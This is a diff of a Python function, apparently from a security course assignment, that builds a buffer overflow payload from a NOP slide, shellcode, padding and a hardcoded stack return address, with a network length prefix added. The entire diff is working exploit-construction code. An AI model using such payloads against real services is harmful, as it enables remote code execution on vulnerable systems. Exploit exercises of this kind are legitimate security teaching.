@@ -29,17 +29,23 @@ def get_payload():
     shellcode and the return address.
     '''
     # TODO: IMPLEMENT THIS FUNCTION
-    desired_shell_length = 1040
+    desired_shell_length = 1040 # as explained in q1
     nop = '\x90'
-    address_to_return = "\xbc\xdd\xff\xbf"
-    shellcode = get_shellcode()
-    shellcode_length = len(shellcode)
+    address_to_return = "\xdc\xdd\xff\xbf" # this is the address in the middle of the NOPs slide
+    shellcode = get_shellcode() # get our pure shellcode logic
+    shellcode_length = len(shellcode) 
+    slide_nops = nop * 100
+    # using all the NOPs at the begining causes us problems with the stack location during the shellcode execution
+    # so we won't add all our NOPs in the begining of the message but add a small NOPs slide at the begining
+    # rest of the nops will be at the end of the shellcode itself
+    slide_nops_len = len(slide_nops)
 
-    message = shellcode + nop * (desired_shell_length - shellcode_length) + address_to_return
+    # full structe - small slide NOPs, shellcode, rest of NOPs, address to return
+    message = slide_nops + shellcode + nop * (desired_shell_length - shellcode_length - slide_nops_len) + address_to_return
     message_length = len(message)
-    message_length_newtork_order = struct.pack('>L', message_length)
+    message_length_newtork_order = struct.pack('>L', message_length) # add size as in q1
 
-    return message_length_newtork_order + message    
+    return message_length_newtork_order + message # return payoload - message + size
 
 
 def main():
